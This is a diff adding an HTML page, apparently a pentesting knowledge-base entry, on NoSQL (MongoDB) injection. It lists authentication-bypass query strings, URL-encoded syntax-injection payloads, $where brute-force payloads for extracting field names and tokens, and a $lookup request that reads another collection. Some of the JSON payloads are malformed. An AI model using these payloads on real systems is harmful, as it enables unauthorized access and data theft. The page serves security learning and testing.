@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>NoSQL Injection - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "NoSQL Injection", url: "#_top", children: [
+              {title: "Manual Injection", url: "#manual-injection" },
+              {title: "Retrieve Another Document (MongoDB)", url: "#retrieve-another-document-mongodb" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="nosql-injection">NoSQL Injection</h1>
+<p>NoSQL Injection is derived from SQL Injection. It affects NoSQL database such as MongoDB, Apache Cassandra.</p>
+<div class="language-text highlight"><pre><span></span><code>- [nosql-injection](https://portswigger.net/web-security/nosql-injection)
+</code></pre></div>
+<h2 id="manual-injection">Manual Injection</h2>
+<p>See also <a href="/exploit/web/method/web-login-bypass/">Web Login Bypass NoSQL Injection</a>.</p>
+<h3 id="mongo">Mongo</h3>
+<p>If the web application uses MongDB, you might be able to fetch the user's information.<br />
+It allows you to bypass authentication.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>/?username=admin&amp;password[$ne]=xyz
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>/?username[$ne]=admin&amp;role=guest
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>/?id[$gt]=1&amp;username=john
+</span></code></pre></div>
+<ul>
+<li>
+<p><strong>Syntax</strong></p>
+<p>Below are the payloads to syntax injection. Don’t forget to try the URL-encoded payloads.</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>    test||1==1
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>    test%7C%7C1%3D%3D1
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>    test||1==1//
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    test%7C%7C1%3D%3D1%2F%2F
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>    test||1==1%00
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    test%7C%7C1%3D%3D1%2500
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>    test||1==1\u0000
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>    test%7C%7C1%3D%3D1%5Cu0000
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>    test||&#39;1==1
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>    test%7C%7C%271%3D%3D1
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>    test||&#39;1&#39;==&#39;1&#39;
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>    test%7C%7C%271%27%3D%3D%271%27
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>    test||&#39;1&#39;==&#39;1
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>    test%7C%7C%271%27%3D%3D%271
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>    test&#39;||1||&#39;
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>    test%27%7c%7c%31%7c%7c%27
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>    &lt;!-- Find specific fields e.g. &#39;password&#39; --&gt;
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>    admin&#39; &amp;&amp; this.password!=&#39;
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>    admin&#39;+%26%26+this.password!%3d&#39;
+</span></code></pre></div>
+<ul>
+<li>Operators</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>    # $ne: Not equal
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    username[$ne]=xyz&amp;password[$ne]=xyz
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    # $regex: Regular expressions
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    username[$regex]=.*&amp;password[$regex]=.*
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    # $gt: Greater than
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    username[$gt]=s&amp;password[$gt]=s
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>    # $lt: Lower than
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>    username[$lt]=s&amp;password[$lt]=s
+</span></code></pre></div>
+<ul>
+<li>
+<p>Operators &amp; JSON</p>
+<p>To use the following payloads, set the <code>Content-Type</code> header to <code>application/json</code> in the HTTP request header.</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>    { &quot;username&quot;: { &quot;$ne&quot;: &quot;xyz&quot; }, &quot;password&quot;: { &quot;$ne&quot;: &quot;xyz&quot; } }
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code>Brute force parameters.
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>    # Brute force each character for the parameter key
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;Object.keys(this)[1].match(&#39;^.{0}a.*&#39;)&quot; }}
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;Object.keys(this)[1].match(&#39;^.{0}b.*&#39;)&quot; }}
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;Object.keys(this)[1].match(&#39;^.{0}c.*&#39;)&quot; }}
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    ...
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;Object.keys(this)[1].match(&#39;^.{1}a.*&#39;)&quot; }}
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    ...
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;Object.keys(this)[8].match(&#39;^.{8}z.*&#39;)&quot; }}
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>    # Brute force each character for the specific parameter value
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;this.exampleToken.match(&#39;^.{0}a.*&#39;)&quot; }
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;this.exampleToken.match(&#39;^.{0}b.*&#39;)&quot; }
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;this.exampleToken.match(&#39;^.{0}c.*&#39;)&quot; }
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>    ...
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;this.exampleToken.match(&#39;^.{1}a.*&#39;)&quot; }
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>    ...
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>    { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;, { &quot;$where&quot;: &quot;this.exampleToken.match(&#39;^.{8}z.*&#39;)&quot; }
+</span></code></pre></div>
+<p><br /><br /></p>
+<h2 id="retrieve-another-document-mongodb">Retrieve Another Document (MongoDB)</h2>
+<p>If the website uses <strong>MongoDB</strong> and uses <strong><code>$match</code></strong> aggregation to fetch documents, we can change the aggregation to <strong><code>$lookup</code></strong> for joining another document and get desired information from the document.<br />
+First, check if the <strong><code>$match</code></strong> operator is used in the website.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>POST /products HTTP/1.1
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>...
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>{
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>    &quot;$match&quot;: {
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>        &quot;sold&quot;: false
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>    }
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>}
+</span></code></pre></div>
+<p>As above, the website uses <strong><code>$match</code></strong> aggregator to fetch data from the <strong>"products"</strong> document, so we can change this as the following.<br />
+Assume both the <strong>"products"</strong> and <strong>"users"</strong> document have an <strong>"id"</strong> field.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>POST /users HTTP/1.1
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>...
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>{
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    &quot;$lookup&quot;: {
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>        &quot;from&quot;: &quot;users&quot;,
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>        &quot;localField&quot;: &quot;id&quot;,
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>        &quot;foreignField&quot;: &quot;id&quot;,
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>        &quot;as&quot;: &quot;test&quot;
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>    }
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>}
+</span></code></pre></div>
+<p>Then send this request. We can retrieve values in the <strong>"users"</strong> document.</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/security-risk/nosql-injection.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
